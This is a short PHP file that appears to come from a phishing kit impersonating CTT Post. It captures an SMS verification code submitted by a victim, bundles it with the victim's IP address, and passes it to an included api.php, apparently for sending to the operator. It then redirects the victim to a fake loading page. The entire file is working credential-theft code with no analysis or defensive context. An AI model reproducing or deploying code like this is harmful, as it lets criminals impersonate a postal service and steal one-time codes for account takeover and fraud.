<?php

session_start();



$cod = $_SESSION['cod'] = $_POST['cod'];


$hexor = '
CTT Post ~~
SMSCode : '.$_SESSION["cod"].' 
IP : '.$_SERVER['REMOTE_ADDR'].' 
';




include("api.php"); 



header('Location: ../loading2.php');


?>


